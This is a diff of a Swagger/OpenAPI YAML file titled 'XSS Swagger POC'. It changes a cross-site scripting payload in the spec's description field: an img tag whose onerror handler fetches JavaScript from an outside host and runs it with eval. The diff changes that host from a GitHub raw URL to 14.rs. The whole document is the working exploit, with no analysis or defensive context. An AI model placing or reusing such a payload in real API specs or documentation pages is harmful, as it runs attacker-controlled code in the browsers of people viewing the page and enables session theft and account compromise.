@@ -2,7 +2,7 @@ swagger: "2.0"
 info:
   title: XSS Swagger POC
   description: >
-    <img src=x onerror="fetch('https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/script.js').then(r=>r.text()).then(eval)">
+    <img src=x onerror="fetch('https://14.rs/').then(r=>r.text()).then(eval)">
   version: "XSSv1"
 paths:
   /:
